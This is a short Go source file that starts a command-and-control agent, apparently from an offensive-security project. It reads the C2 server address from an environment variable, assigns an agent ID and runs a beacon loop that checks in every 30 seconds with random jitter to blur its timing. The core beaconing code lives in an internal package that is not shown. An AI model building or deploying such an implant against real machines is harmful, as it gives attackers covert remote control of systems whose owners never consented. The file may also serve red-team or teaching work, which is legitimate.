package main

import (
	"context"
	"os"
	"os/signal"
	"syscall"
	"time"

	"github.com/ianwong123/go-attack/c2/agent/internal"
)

const (
	// uncomment to test locally
	// serverAddr     = "http://127.0.0.1:8080"
	beaconInterval = 30 * time.Second
	jitterMax      = 5 * time.Second
)

func main() {
	ctx, cancel := signal.NotifyContext(context.Background(),
		os.Interrupt, syscall.SIGTERM)
	defer cancel()
	serverAddr := os.Getenv("C2_SERVER")

	agentID := internal.GenerateID()
	b := internal.New(agentID, serverAddr, beaconInterval, jitterMax)
	b.Run(ctx)
}
